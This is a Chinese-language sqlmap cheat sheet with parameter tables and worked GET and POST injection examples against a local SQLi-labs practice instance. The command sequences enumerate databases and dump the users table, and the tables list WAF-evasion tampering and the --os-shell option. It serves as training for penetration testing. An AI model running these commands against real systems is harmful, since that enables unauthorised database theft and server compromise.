## 基础命令结构
kali:

sqlmap -u [目标URL] [参数]

## 参数速查

### 1、必选参数

| 参数 | 作用 | 示例 |
|------|------|------|
| `-u <URL>` | 指定目标URL（GET请求） | `-u "http://example.com/?id=1"` |
| `--data=<DATA>` | 指定POST请求数据 | `--data="user=admin&pass=123"` |
| `-r <文件>` | 从文件加载HTTP请求（如Burp抓包） | `-r request.txt` |
| `-l <日志>` | 从Burp日志中解析目标 | `-l burp.log` |

### 2、注入技术参数

| 参数 | 作用 | 适用场景 |
|------|------|------|
| `--technique=B` | 布尔盲注（Boolean-based） | 页面有真/假状态差异 |
| `--technique=T` | 时间盲注（Time-based） | 无回显，依赖延迟（如Less-9） |
| `--technique=E` | 报错注入（Error-based） | 数据库返回错误信息 |
| `--technique=U` | UNION联合查询 | 有回显且列数可控 |

### 3、数据库操作参数

| 参数 | 作用 | 示例 |
|------|------|------|
| `--dbs` | 列出所有数据库 | `--dbs` |
| `--current-db` | 获取当前数据库名 | `--current-db` |
| `-D <db>` | 指定目标数据库 | `-D security` |
| `--tables` | 列出表名 | `--tables` |
| `-T <table>` | 指定目标表 | `-T users` |
| `--columns` | 列出列名 | `--columns` |
| `--dump` | 导出表数据 | `--dump` |
| `--schema` | 导出数据库结构 | `--schema` |

### 4、优化与绕过参数

| 参数 | 作用 | 示例 |
|------|------|------|
| `--threads=10` | 多线程加速（默认1） | `--threads=10` |
| `--time-sec=2` | 设置时间盲注延迟（默认5秒） | `--time-sec=2` |
| `--tamper=<脚本>` | 混淆Payload绕过WAF | `--tamper=space2comment` |
| `--random-agent` | 随机User-Agent | `--random-agent` |
| `--proxy=<代理>` | 通过代理发送请求 | `--proxy="http://127.0.0.1:8080"` |

### 5、常用功能参数

| 参数 | 作用 | 示例 |
|------|------|------|
| `--batch` | 非交互模式（自动确认） | `--batch` |
| `--level=1-5` | 测试等级（1-5，默认1） | `--level=3` |
| `--risk=1-3` | 风险等级（1-3，默认1） | `--risk=2` |
| `--os-shell` | 获取操作系统Shell | `--os-shell` |
| `--sql-shell` | 获取SQL交互Shell | `--sql-shell` |
| `--output-dir=<路径>` | 指定结果保存目录 | `--output-dir=/tmp/` |

## 使用示例

### GET注入

1、注入前测试

sqlmap -u "http://127.0.0.1:8081/Less-8/?id=1" --batch

![img.png](img.png)

布尔盲注和时间盲注均可用

2、开始注入：

查看全部数据库

sqlmap -u "http://127.0.0.1:8081/Less-8/?id=1" --dbs --technique=B --batch

查看表名

sqlmap -u "http://127.0.0.1:8081/Less-8/?id=1" -D security --tables --technique=B --batch

查看列名

sqlmap -u "http://127.0.0.1:8081/Less-8/?id=1" -D security -T users --columns --technique=B --batch

查看数据

sqlmap -u "http://127.0.0.1:8081/Less-8/?id=1" -D security -T users --dump --technique=B --batch

### POST注入

1、注入前测试

sqlmap -u "http://localhost:8081/Less-13/" --data="uname=admin&passwd=123" --batch

![img_1.png](img_1.png)

2、开始注入：

查看全部数据库

sqlmap -u "http://localhost:8081/Less-13/" --data="uname=admin&passwd=123" --dbs --batch

查看表名

sqlmap -u "http://localhost:8081/Less-13/" --data="uname=admin&passwd=123" -D security --tables --batch

查看列名

sqlmap -u "http://localhost:8081/Less-13/" --data="uname=admin&passwd=123" -D security -T users --columns --batch

查看数据

sqlmap -u "http://localhost:8081/Less-13/" --data="uname=admin&passwd=123" -D security -T users --dump --batch 

